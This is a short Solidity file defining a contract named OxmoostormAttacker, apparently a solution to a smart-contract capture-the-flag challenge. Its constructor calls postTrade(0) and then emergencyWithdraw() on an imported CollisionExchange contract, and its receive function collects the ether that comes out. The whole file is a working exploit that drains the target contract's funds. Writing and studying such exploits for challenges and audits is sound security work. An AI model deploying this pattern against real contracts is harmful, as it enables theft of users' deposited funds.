pragma solidity 0.8.7;

import "./CollisionExchange.sol";

contract OxmoostormAttacker {
    
    constructor(CollisionExchange instance) payable {
        
        instance.postTrade(0);
        instance.emergencyWithdraw();

    }

    receive() external payable { }

}


